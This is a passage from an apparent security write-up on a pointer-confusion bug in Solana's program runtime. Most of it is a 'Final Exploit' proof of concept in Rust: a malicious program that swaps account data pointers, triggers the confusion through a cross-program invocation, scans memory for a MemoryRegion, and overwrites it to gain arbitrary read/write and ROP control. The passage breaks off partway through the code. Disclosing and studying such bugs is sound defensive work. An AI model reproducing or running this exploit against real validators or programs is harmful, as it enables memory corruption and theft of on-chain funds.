<p class="text-xl py-3 text-pretty sm:text-justify">Once we&#x27;ve successfully hunted down the target <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>, we can overwrite the <strong>POINTER</strong> account&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> and set its state to writable to achieve arbitrary memory access. For example, we can calculate the thread memory base and hijack return addresses with ROP gadgets.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">let</span><span> thread_mem </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x48</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span></span><span class="token token" style="color:#999">// Overwrite POINTER account&#x27;s backing buffer pointer (arb_ptr)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span></span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x490</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> thread_mem</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span></span><span class="token token" style="color:#999">// Set memory region state to writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span></span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x4b8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span></code></div></pre>
<h3 class="text-3xl py-4 border-b border-white/10">Final Exploit</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Putting them all together, here&#x27;s the final PoC:</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>ptr</span><span class="token token" style="color:#ccc">,</span><span> mem</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#e2777a">rc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#e2777a">cell</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span></span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">solana_program</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#e2777a">account_info</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#e2777a">instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#e2777a">program</span><span class="token token" style="color:#ccc">::</span><span>invoke_signed</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    entrypoint</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#e2777a">entrypoint</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#e2777a">pubkey</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span></span><span class="token token macro" style="color:#f8c555">entrypoint!</span><span class="token token" style="color:#ccc">(</span><span>process_instruction</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span></span><span class="token token" style="color:#999">// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span></span><span class="token token" style="color:#999">// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span></span><span class="token token" style="color:#999">// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">process_instruction</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>    program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>    _instruction_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> accounts</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">8</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> swap_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> pointer_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> leverage_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">6</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>        </span><span class="token token" style="color:#999">// Prepare LEVERAGE and SWAP accounts to set up memory layout</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span>        </span><span class="token token" style="color:#999">// Resize LEVERAGE to simplify exploit logic</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">34</span><span>        </span><span class="token token" style="color:#999">// Overwrite SWAP&#x27;s data pointer with LEVERAGE&#x27;s pointer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">35</span><span>        </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">36</span><span>            </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">37</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">38</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">39</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">40</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">41</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">42</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">43</span><span>        </span><span class="token token" style="color:#999">// Invoke CPI call to trigger pointer confusion</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">44</span><span>        </span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">45</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">46</span><span>                </span><span class="token token" style="color:#67cdcc">*</span><span>program_id</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">47</span><span>                </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">48</span><span>                </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">49</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">50</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">51</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">52</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">53</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">54</span><span>        </span><span class="token token" style="color:#999">// Resize LEVERAGE back to a larger size for memory scanning</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">55</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0xa00000</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">56</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">57</span><span>        </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">58</span><span>            </span><span class="token token" style="color:#999">// Scan memory to locate MemoryRegion structure</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">59</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> data_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x2840</span><span class="token token" style="color:#ccc">;</span><span>
